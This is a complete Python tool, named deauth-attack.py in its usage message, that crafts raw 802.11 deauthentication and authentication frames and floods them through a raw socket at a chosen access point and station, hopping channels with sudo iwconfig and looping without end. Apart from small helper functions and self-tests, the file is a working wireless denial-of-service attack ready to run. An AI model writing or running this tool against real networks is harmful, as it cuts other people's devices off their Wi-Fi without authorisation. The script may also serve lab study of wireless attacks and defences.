#!/usr/bin/env python3
from functools import *

import os
import sys
import socket

DEBUG = True

def err(*string):
  print(*string, file=sys.stderr)

def TEST(code, res):
  if not DEBUG: return
  err("%s %s == %s : %s" % ("PASS" if eval(code) == res else "FAIL", code, res, eval(code)))

reduce_add = lambda func, arr: reduce(lambda acc, cur: acc + func(cur), arr, 0)
TEST("reduce_add(lambda x: x == 1, (1, 1, 1, 0))", 3)

reduce_not = lambda func, arr: reduce_add(lambda x: not func(x), arr)
TEST("reduce_not(lambda x: x == 1, (1, 1, 1, 0))", 1)

reduce_check = lambda func, arr: not reduce_not(func, arr)
TEST("reduce_check(lambda x: x == 1, (1, 1, 1, 0))", False)

split = lambda string, sep: tuple(string.split(sep))
TEST("split('A B', ' ')", ("A", "B"))

replace = lambda string, finded, changed: string.replace(finded, changed)
TEST("replace('hello world', 'hello', 'wireless')", 'wireless world')

is_hex_char = lambda char: char in "0123456789ABCDEFabcdef" and len(char) == 1
TEST("is_hex_char('A')", True)

is_hex = lambda string: reduce_check(is_hex_char, string) and True
TEST("is_hex('AEG')", False)

is_mac = lambda string: reduce_check(is_hex, split(string, ":")) and len(string) == 17
TEST("is_mac('12:34:56:78:9G:AB')", False)

split_mac = lambda mac: split(mac, ":") if is_mac(mac) else False
TEST("split_mac('12:34:56:78:90:AB')", ('12', '34', '56', '78', '90', 'AB'))

mac2bin = lambda mac: bytes([int(x, 16) for x in split_mac(mac)]) if is_mac(mac) else False
TEST("mac2bin('41:41:41:41:41:41')", b"\x41\x41\x41\x41\x41\x41")

AUTH = b"\x00\x00\x18\x00\x2e\x40\x00\xa0\x20\x08\x00\x00\x00\x02\x71\x09\xa0\x00\xd1\x00\x00\x00\xd1\x00\xb0\x08\x3a\x01AAAAAABBBBBBCCCCCC\xd0\x0e\x00\x00\x01\x00\x00\x00"

gen_auth = lambda ap, station: AUTH[:28] + mac2bin(ap) + mac2bin(station) + mac2bin(ap) + AUTH[46:] if is_mac(ap) and is_mac(station) else False

DEAUTH_unicast = b"\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00\xc0\x00\x3a\x01AAAAAABBBBBB\x52\x77\x05\xad\x99\x32\x00\x00\x07\x00"

gen_deauth_unicast = lambda ap, station: DEAUTH_unicast[:16] + mac2bin(station) + mac2bin(ap) + DEAUTH_unicast[28:] if is_mac(ap) and is_mac(station) else False


DEAUTH_broadcast = b"\x00\x00\x0b\x00\x00\x80\x02\x00\x00\x00\x00\xc0\x00\x00\x00\xff\xff\xff\xff\xff\xffAAAAAA\x52\x77\x05\xad\x99\x32\x00\x00\x07\x00"

gen_deauth_broadcast = lambda ap: DEAUTH_broadcast[:21] + mac2bin(ap) + DEAUTH_broadcast[27:] if is_mac(ap) else False

def auth(interface, ap, station, loop=1000):
  soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
  soc.bind((interface, 0x0003))
  i = 0
  ch = 1
  while type(loop) == type(None) or i < loop:
    i += 1

    ch = ((ch + 1) % 13) + 1
    os.system("sudo iwconfig %s channel %d" % (interface, ch))

    data = gen_auth(ap, station)
    packet = soc.send(data)

  return

def deauth(interface, ap, station, loop=1000):
  soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
  soc.bind((interface, 0x0003))
  i = 0
  ch = 1
  while type(loop) == type(None) or i < loop:
    i += 1

    ch = ((ch + 1) % 13) + 1
    os.system("sudo iwconfig %s channel %d" % (interface, ch))

    data = gen_deauth_unicast(ap, station) if station else gen_deauth_broadcast(ap)
    packet = soc.send(data)


def opt():
  global opt
  opt_list = set([x[1:] for x in sys.argv if x[0] == "-"])
  opt = lambda : opt_list
  return opt_list

def arg():
  global arg
  arg_list = [x for x in sys.argv if x[0] != "-"]
  arg = lambda : arg_list
  return arg_list

def main():
  if len(arg()) < 3 or not reduce_check(is_mac, arg()[2:]) or ("auth" in opt() and len(arg()) < 4):
    print("syntax : python3 deauth-attack.py <interface> <ap mac> [<station mac> [-auth]]")
    print("sample : python3 deauth-attack.py mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")
    return -1
  if "auth" in opt(): auth(arg()[1], arg()[2], arg()[3], None)
  else: deauth(arg()[1], arg()[2], arg()[3] if len(arg()) == 4 else False, None)

if __name__ == "__main__":
  exit(main())
